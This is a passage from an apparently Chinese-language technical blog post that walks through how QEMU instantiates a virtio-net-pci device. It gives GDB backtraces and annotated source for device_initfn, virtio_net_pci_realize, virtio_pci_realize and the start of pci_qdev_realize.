type=0x5555570e8ab0) at ../../qemu/qom/object.c:571</span></span><br><span class="line"><span class="comment">//#7  0x0000555555ea86cf in object_new_with_type (type=0x5555570e8ab0) at ../../qemu/qom/object.c:791</span></span><br><span class="line"><span class="comment">//#8  0x0000555555ea873b in object_new (typename=0x5555580bbfd0 &quot;virtio-net-pci&quot;) at ../../qemu/qom/object.c:806</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e9ff6a in qdev_new (name=0x5555580bbfd0 &quot;virtio-net-pci&quot;) at ../../qemu/hw/core/qdev.c:166</span></span><br><span class="line"><span class="comment">//#10 0x0000555555bd01c4 in qdev_device_add_from_qdict (opts=0x5555580bc3b0, from_json=false, errp=0x7fffffffd690) at ../../qemu/system/qdev-monitor.c:681</span></span><br><span class="line"><span class="comment">//#11 0x0000555555bd03d9 in qdev_device_add (opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#12 0x0000555555bda4e7 in device_init_func (opaque=0x0, opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#13 0x00005555560c2a63 in qemu_opts_foreach (list=0x555556f53ec0 &lt;qemu_device_opts&gt;, func=0x555555bda4bc &lt;device_init_func&gt;, opaque=0x0, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#14 0x0000555555bde1b8 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#15 0x0000555555bde3fe in qmp_x_exit_preconfig (errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#16 0x0000555555be0db6 in qemu_init (argc=39, argv=0x7fffffffdad8) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#17 0x0000555555e9b7ed in main (argc=39, argv=0x7fffffffdad8) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7629d90 in __libc_start_call_main (main=main@entry=0x555555e9b7c9 &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffdad8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#19 0x00007ffff7629e40 in __libc_start_main_impl (main=0x555555e9b7c9 &lt;main&gt;, argc=39, argv=0x7fffffffdad8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdac8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#20 0x000055555586f0d5 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">device_initfn</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev = DEVICE(obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phase_check(PHASE_MACHINE_READY)) &#123;</span><br><span class="line">        dev-&gt;hotplugged = <span class="number">1</span>;</span><br><span class="line">        qdev_hot_added = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dev-&gt;instance_id_alias = <span class="number">-1</span>;</span><br><span class="line">    dev-&gt;realized = <span class="literal">false</span>;</span><br><span class="line">    dev-&gt;allow_unplug_during_migration = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    QLIST_INIT(&amp;dev-&gt;gpios);</span><br><span class="line">    QLIST_INIT(&amp;dev-&gt;clocks);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里仅仅是初始化了必要的字段。</p><h2 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h2><p>根据前面<a href="#类初始化">类初始化</a>的内容，<strong>virtio</strong>设备将其父类数据结构的<strong>realize</strong>函数指针依次设置为了<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2490"><strong>virtio_pci_dc_realize()</strong></a>、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2272"><strong>virtio_pci_realize()</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L49"><strong>virtio_net_pci_realize()</strong></a>，而<strong>virtio-pci</strong>类的<strong>parent_dc_realize</strong>字段为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L2031"><strong>pci_qdev_realize()</strong></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_net_pci_realize (vpci_dev=0x5555580a4fa0, errp=0x7fffffffd2f0) at ../../qemu/hw/virtio/virtio-net-pci.c:51</span></span><br><span class="line"><span class="comment">//#1  0x0000555555b749a9 in virtio_pci_realize (pci_dev=0x5555580a4fa0, errp=0x7fffffffd2f0) at ../../qemu/hw/virtio/virtio-pci.c:2407</span></span><br><span class="line"><span class="comment">//#2  0x0000555555a9a921 in pci_qdev_realize (qdev=0x5555580a4fa0, errp=0x7fffffffd3b0) at ../../qemu/hw/pci/pci.c:2093</span></span><br><span class="line"><span class="comment">//#3  0x0000555555b74dc4 in virtio_pci_dc_realize (qdev=0x5555580a4fa0, errp=0x7fffffffd3b0) at ../../qemu/hw/virtio/virtio-pci.c:2501</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e9c4f4 in device_set_realized (obj=0x5555580a4fa0, value=true, errp=0x7fffffffd620) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea7cfb in property_set_bool (obj=0x5555580a4fa0, v=0x5555580b51a0, name=0x5555562f9dd1 &quot;realized&quot;, opaque=0x5555570f4510, errp=0x7fffffffd620) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#6  0x0000555555ea5891 in object_property_set (obj=0x5555580a4fa0, name=0x5555562f9dd1 &quot;realized&quot;, v=0x5555580b51a0, errp=0x7fffffffd620) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#7  0x0000555555eaa4ca in object_property_set_qobject (obj=0x5555580a4fa0, name=0x5555562f9dd1 &quot;realized&quot;, value=0x5555580b3d60, errp=0x7fffffffd620) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#8  0x0000555555ea5c4a in object_property_set_bool (obj=0x5555580a4fa0, name=0x5555562f9dd1 &quot;realized&quot;, value=true, errp=0x7fffffffd620) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e9bc0e in qdev_realize (dev=0x5555580a4fa0, bus=0x555557415420, errp=0x7fffffffd620) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#10 0x0000555555bcdee9 in qdev_device_add_from_qdict (opts=0x5555580a31b0, from_json=false, errp=0x7fffffffd620) at ../../qemu/system/qdev-monitor.c:718</span></span><br><span class="line"><span class="comment">//#11 0x0000555555bcdf99 in qdev_device_add (opts=0x5555570ef1c0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#12 0x0000555555bd80a7 in device_init_func (opaque=0x0, opts=0x5555570ef1c0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#13 0x00005555560be1e2 in qemu_opts_foreach (list=0x555556f4bec0 &lt;qemu_device_opts&gt;, func=0x555555bd807c &lt;device_init_func&gt;, opaque=0x0, errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#14 0x0000555555bdbd46 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#15 0x0000555555bdbf8c in qmp_x_exit_preconfig (errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#16 0x0000555555bde944 in qemu_init (argc=35, argv=0x7fffffffda68) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#17 0x0000555555e96f93 in main (argc=35, argv=0x7fffffffda68) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=35, argv=argv@entry=0x7fffffffda68) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#19 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=35, argv=0x7fffffffda68, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffda58) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#20 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_pci_realize</span><span class="params">(VirtIOPCIProxy *vpci_dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *qdev = DEVICE(vpci_dev);</span><br><span class="line">    VirtIONetPCI *dev = VIRTIO_NET_PCI(vpci_dev);</span><br><span class="line">    DeviceState *vdev = DEVICE(&amp;dev-&gt;vdev);</span><br><span class="line">    VirtIONet *net = VIRTIO_NET(vdev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vpci_dev-&gt;nvectors == DEV_NVECTORS_UNSPECIFIED) &#123;</span><br><span class="line">        vpci_dev-&gt;nvectors = <span class="number">2</span> * MAX(net-&gt;nic_conf.peers.queues, <span class="number">1</span>)</span><br><span class="line">            + <span class="number">1</span> <span class="comment">/* Config interrupt */</span></span><br><span class="line">            + <span class="number">1</span> <span class="comment">/* Control vq */</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtio_net_set_netclient_name(&amp;dev-&gt;vdev, qdev-&gt;id,</span><br><span class="line">                                  object_get_typename(OBJECT(qdev)));</span><br><span class="line">    qdev_realize(vdev, BUS(&amp;vpci_dev-&gt;bus), errp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOPCIProxy *proxy = VIRTIO_PCI(pci_dev);</span><br><span class="line">    VirtioPCIClass *k = VIRTIO_PCI_GET_CLASS(pci_dev);</span><br><span class="line">    <span class="type">bool</span> pcie_port = pci_bus_is_express(pci_get_bus(pci_dev)) &amp;&amp;</span><br><span class="line">                     !pci_bus_is_root(pci_get_bus(pci_dev));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fd-based ioevents can&#x27;t be synchronized in record/replay */</span></span><br><span class="line">    <span class="keyword">if</span> (replay_mode != REPLAY_MODE_NONE) &#123;</span><br><span class="line">        proxy-&gt;flags &amp;= ~VIRTIO_PCI_FLAG_USE_IOEVENTFD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * virtio pci bar layout used by default.</span></span><br><span class="line"><span class="comment">     * subclasses can re-arrange things if needed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *   region 0   --  virtio legacy io bar</span></span><br><span class="line"><span class="comment">     *   region 1   --  msi-x bar</span></span><br><span class="line"><span class="comment">     *   region 2   --  virtio modern io bar (off by default)</span></span><br><span class="line"><span class="comment">     *   region 4+5 --  virtio modern memory (64bit) bar</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    proxy-&gt;legacy_io_bar_idx  = <span class="number">0</span>;</span><br><span class="line">    proxy-&gt;msix_bar_idx       = <span class="number">1</span>;</span><br><span class="line">    proxy-&gt;modern_io_bar_idx  = <span class="number">2</span>;</span><br><span class="line">    proxy-&gt;modern_mem_bar_idx = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    proxy-&gt;common.offset = <span class="number">0x0</span>;</span><br><span class="line">    proxy-&gt;common.size = <span class="number">0x1000</span>;</span><br><span class="line">    proxy-&gt;common.type = VIRTIO_PCI_CAP_COMMON_CFG;</span><br><span class="line"></span><br><span class="line">    proxy-&gt;isr.offset = <span class="number">0x1000</span>;</span><br><span class="line">    proxy-&gt;isr.size = <span class="number">0x1000</span>;</span><br><span class="line">    proxy-&gt;isr.type = VIRTIO_PCI_CAP_ISR_CFG;</span><br><span class="line"></span><br><span class="line">    proxy-&gt;device.offset = <span class="number">0x2000</span>;</span><br><span class="line">    proxy-&gt;device.size = <span class="number">0x1000</span>;</span><br><span class="line">    proxy-&gt;device.type = VIRTIO_PCI_CAP_DEVICE_CFG;</span><br><span class="line"></span><br><span class="line">    proxy-&gt;notify.offset = <span class="number">0x3000</span>;</span><br><span class="line">    proxy-&gt;notify.size = virtio_pci_queue_mem_mult(proxy) * VIRTIO_QUEUE_MAX;</span><br><span class="line">    proxy-&gt;notify.type = VIRTIO_PCI_CAP_NOTIFY_CFG;</span><br><span class="line"></span><br><span class="line">    proxy-&gt;notify_pio.offset = <span class="number">0x0</span>;</span><br><span class="line">    proxy-&gt;notify_pio.size = <span class="number">0x4</span>;</span><br><span class="line">    proxy-&gt;notify_pio.type = VIRTIO_PCI_CAP_NOTIFY_CFG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* subclasses can enforce modern, so do this unconditionally */</span></span><br><span class="line">    <span class="keyword">if</span> (!(proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_VDPA)) &#123;</span><br><span class="line">        memory_region_init(&amp;proxy-&gt;modern_bar, OBJECT(proxy), <span class="string">&quot;virtio-pci&quot;</span>,</span><br><span class="line">                           <span class="comment">/* PCI BAR regions must be powers of 2 */</span></span><br><span class="line">                           pow2ceil(proxy-&gt;notify.offset + proxy-&gt;notify.size));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        proxy-&gt;lm.offset = proxy-&gt;notify.offset + proxy-&gt;notify.size;</span><br><span class="line">        proxy-&gt;lm.size = <span class="number">0x20</span> + VIRTIO_QUEUE_MAX * <span class="number">4</span>;</span><br><span class="line">        memory_region_init(&amp;proxy-&gt;modern_bar, OBJECT(proxy), <span class="string">&quot;virtio-pci&quot;</span>,</span><br><span class="line">                           <span class="comment">/* PCI BAR regions must be powers of 2 */</span></span><br><span class="line">                           pow2ceil(proxy-&gt;lm.offset + proxy-&gt;lm.size));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (proxy-&gt;disable_legacy == ON_OFF_AUTO_AUTO) &#123;</span><br><span class="line">        proxy-&gt;disable_legacy = pcie_port ? ON_OFF_AUTO_ON : ON_OFF_AUTO_OFF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!virtio_pci_modern(proxy) &amp;&amp; !virtio_pci_legacy(proxy)) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;device cannot work as neither modern nor legacy mode&quot;</span></span><br><span class="line">                   <span class="string">&quot; is enabled&quot;</span>);</span><br><span class="line">        error_append_hint(errp, <span class="string">&quot;Set either disable-modern or disable-legacy&quot;</span></span><br><span class="line">                          <span class="string">&quot; to off\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pcie_port &amp;&amp; pci_is_express(pci_dev)) &#123;</span><br><span class="line">        <span class="type">int</span> pos;</span><br><span class="line">        <span class="type">uint16_t</span> last_pcie_cap_offset = PCI_CONFIG_SPACE_SIZE;</span><br><span class="line"></span><br><span class="line">        pos = pcie_endpoint_cap_init(pci_dev, <span class="number">0</span>);</span><br><span class="line">        assert(pos &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        pos = pci_add_capability(pci_dev, PCI_CAP_ID_PM, <span class="number">0</span>,</span><br><span class="line">                                 PCI_PM_SIZEOF, errp);</span><br><span class="line">        <span class="keyword">if</span> (pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pci_dev-&gt;<span class="built_in">exp</span>.pm_cap = pos;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Indicates that this function complies with revision 1.2 of the</span></span><br><span class="line"><span class="comment">         * PCI Power Management Interface Specification.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        pci_set_word(pci_dev-&gt;config + pos + PCI_PM_PMC, <span class="number">0x3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_AER) &#123;</span><br><span class="line">            pcie_aer_init(pci_dev, PCI_ERR_VER, last_pcie_cap_offset,</span><br><span class="line">                          PCI_ERR_SIZEOF, <span class="literal">NULL</span>);</span><br><span class="line">            last_pcie_cap_offset += PCI_ERR_SIZEOF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_INIT_DEVERR) &#123;</span><br><span class="line">            <span class="comment">/* Init error enabling flags */</span></span><br><span class="line">            pcie_cap_deverr_init(pci_dev);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_INIT_LNKCTL) &#123;</span><br><span class="line">            <span class="comment">/* Init Link Control Register */</span></span><br><span class="line">            pcie_cap_lnkctl_init(pci_dev);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_INIT_PM) &#123;</span><br><span class="line">            <span class="comment">/* Init Power Management Control Register */</span></span><br><span class="line">            pci_set_word(pci_dev-&gt;wmask + pos + PCI_PM_CTRL,</span><br><span class="line">                         PCI_PM_CTRL_STATE_MASK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_ATS) &#123;</span><br><span class="line">            pcie_ats_init(pci_dev, last_pcie_cap_offset,</span><br><span class="line">                          proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_ATS_PAGE_ALIGNED);</span><br><span class="line">            last_pcie_cap_offset += PCI_EXT_CAP_ATS_SIZEOF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_INIT_FLR) &#123;</span><br><span class="line">            <span class="comment">/* Set Function Level Reset capability bit */</span></span><br><span class="line">            pcie_cap_flr_init(pci_dev);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * make future invocations of pci_is_express() return false</span></span><br><span class="line"><span class="comment">         * and pci_config_size() return PCI_CONFIG_SPACE_SIZE.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        pci_dev-&gt;cap_present &amp;= ~QEMU_PCI_CAP_EXPRESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtio_pci_bus_new(&amp;proxy-&gt;bus, <span class="keyword">sizeof</span>(proxy-&gt;bus), proxy);</span><br><span class="line">    <span class="keyword">if</span> (k-&gt;realize) &#123;</span><br><span class="line">        k-&gt;realize(proxy, errp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_qdev_realize</span><span class="params">(DeviceState *qdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDevice *pci_dev = (PCIDevice *)qdev;</span><br><span class="line">    PCIDeviceClass *pc = PCI_DEVICE_GET_CLASS(pci_dev);</span><br><span class="line">    ObjectClass *klass = OBJECT_CLASS(pc);</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">bool</span> is_default_rom;</span><br><span class="line">    <span class="type">uint16_t</span> class_id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * capped by systemd (see: udev-builtin-net_id.c)</span></span><br><span class="line"><span class="comment">     * as it&#x27;s the only known user honor it to avoid users</span></span><br><span class="line"><span class="comment">     * misconfigure QEMU and then wonder why acpi-index doesn&#x27;t work</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (pci_dev-&gt;acpi_index &gt; ONBOARD_INDEX_MAX) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;acpi-index should be less or equal to %u&quot;</span>,</span><br><span class="line">                   ONBOARD_INDEX_MAX);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * make sure that acpi-index is unique across all present PCI devices</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (pci_dev-&gt;acpi_index) &#123;</span><br><span class="line">        GSequence *used_indexes = pci_acpi_index_list();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (g_sequence_lookup(used_indexes,</span><br><span class="line">                              GINT_TO_POINTER(pci_dev-&gt;acpi_index),</span><br><span class="line">                              g_cmp_uint32, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;a PCI device with acpi-index = %&quot;</span> PRIu32</span><br><span class="line">                       <span class="string">&quot; already exist&quot;</span>, pci_dev-&gt;acpi_index);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g_sequence_insert_sorted(used_indexes,</span><br><span class="line">                                 GINT_TO_POINTER(pci_dev-&gt;acpi_index),</span><br><span class="line">                                 g_cmp_uint32, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pci_dev-&gt;romsize != <span class="number">-1</span> &amp;&amp; !is_power_of_2(pci_dev-&gt;romsize)) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;ROM size %u is not a power of 